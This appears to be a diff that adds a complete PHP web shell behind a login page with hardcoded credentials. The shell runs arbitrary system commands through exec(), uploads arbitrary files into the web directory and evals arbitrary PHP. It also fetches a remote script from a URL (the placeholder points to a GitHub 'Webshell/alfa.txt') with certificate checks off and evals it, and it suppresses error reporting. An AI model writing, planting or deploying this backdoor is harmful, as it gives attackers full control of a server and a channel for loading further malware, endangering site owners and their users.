@@ -1,0 +1,141 @@
+<?php
+// --- Konfigurasi password
+$LOGIN_USERNAME = 'admin';
+$LOGIN_PASSWORD = 'secretpass';
+
+session_start();
+
+function requireLogin() {
+    global $LOGIN_USERNAME, $LOGIN_PASSWORD;
+
+    if (isset($_POST['login_user']) && isset($_POST['login_pass'])) {
+        $u = $_POST['login_user'];
+        $p = $_POST['login_pass'];
+        if ($u === $LOGIN_USERNAME && $p === $LOGIN_PASSWORD) {
+            $_SESSION['logged_in'] = true;
+            header('Location: ' . $_SERVER['PHP_SELF']);
+            exit;
+        }
+    }
+
+    if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
+        ?>
+        <!DOCTYPE html>
+        <html>
+        <head><title>Access Panel</title>
+        <style>
+            body { font-family: Arial; background: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+            .panel { width: 320px; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+            input[type="text"], input[type="password"] { width: 100%; padding: 8px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+            button { width: 100%; padding: 9px; background: #2c3e50; color: white; border: none; border-radius: 4px; cursor: pointer; }
+        </style>
+        </head>
+        <body>
+        <div class="panel">
+            <h2 style="text-align: center;">Access Panel</h2>
+            <form method="post">
+                <input type="text" name="login_user" placeholder="Access code" required>
+                <input type="password" name="login_pass" placeholder="Key" required>
+                <button type="submit">Continue</button>
+            </form>
+        </div>
+        </body>
+        </html>
+        <?php
+        exit;
+    }
+}
+requireLogin();
+
+// DISABLE ALL ERRORS
+ini_set('display_errors', 0);
+error_reporting(0);
+
+echo "<h2>System Shell - Fixed</h2>";
+echo "<p>Login: <b>admin</b> / <b>secretpass</b></p>";
+?>
+
+<style>
+form { margin: 15px 0; }
+label { font-weight: bold; display: block; margin-bottom: 5px; }
+input[type="text"], input[type="file"], textarea { width: 500px; padding: 6px; border: 1px solid #ccc; }
+textarea { height: 100px; }
+button { padding: 8px 12px; background: #007cba; color: white; border: none; border-radius: 4px; }
+button.green { background: #28a745; }
+pre { background: #f0f0f0; padding: 10px; border-radius: 4px; margin: 10px 0; white-space: pre-wrap; }
+</style>
+
+<h3>Test Functions:</h3>
+
+<!-- SYSTEM COMMAND -->
+<form method="post">
+    <label>System Command:</label>
+    <input type="text" name="cmd" placeholder="ls -la">
+    <button>Run Command</button>
+</form>
+<?php if(!empty($_POST['cmd'])){ 
+    echo "<pre>";
+    exec($_POST['cmd'], $output);
+    echo htmlspecialchars(implode("\n", $output));
+    echo "</pre>";
+}?>
+
+<!-- UPLOAD -->
+<form method="post" enctype="multipart/form-data">
+    <label>Upload File:</label>
+    <input type="file" name="file">
+    <button>Upload</button>
+</form>
+<?php if(!empty($_FILES['file']['tmp_name'])){ 
+    $filename = preg_replace('/[^a-zA-Z0-9._-]/', '_', $_FILES['file']['name']);
+    $dest = __DIR__ . '/' . $filename;
+    if(move_uploaded_file($_FILES['file']['tmp_name'], $dest)){
+        echo "<p style='color:green;'>✅ UPLOADED: <a href='$filename' target='_blank'>$filename</a></p>";
+    }
+}?>
+
+<!-- LOCAL EVAL -->
+<form method="post">
+    <label>Local PHP Eval:</label>
+    <textarea name="code" placeholder="echo 'Hello';">echo 'Local OK';</textarea>
+    <button>Eval Local</button>
+</form>
+<?php if(!empty($_POST['code'])){ 
+    ob_start(); @eval($_POST['code']); 
+    echo "<pre>" . htmlspecialchars(ob_get_clean()) . "</pre>";
+}?>
+
+<!-- REMOTE EXEC - ULTRA SAFE -->
+<form method="post">
+    <label>Remote Script URL:</label>
+    <input type="text" name="remote_url" placeholder="https://raw.githubusercontent.com/sk26889/Webshell/refs/heads/main/alfa.txt" value="">
+    <button class="green">🔥 EXECUTE REMOTE</button>
+</form>
+<?php
+if(!empty($_POST['remote_url'])) {
+    echo "<h4>Executing: " . htmlspecialchars($_POST['remote_url']) . "</h4>";
+    
+    $ch = curl_init($_POST['remote_url']);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => 1,
+        CURLOPT_FOLLOWLOCATION => 1,
+        CURLOPT_SSL_VERIFYPEER => 0,
+        CURLOPT_TIMEOUT => 30
+    ]);
+    $code = curl_exec($ch);
+    curl_close($ch);
+    
+    if($code) {
+        // **SINGLE LINE SESSION KILLER**
+        $code = preg_replace('/session_start\s*\(.*\);?/i', '', $code);
+        
+        ob_start();
+        @eval($code);  // **DIRECT EVAL - NO PHP TAG**
+        $output = ob_get_clean();
+        
+        echo "<pre style='background:#2d3748;color:#90ee90;padding:15px;'>" . htmlspecialchars($output) . "</pre>";
+    } else {
+        echo "<p style='color:red;'>Failed to fetch</p>";
+    }
+}
+?>
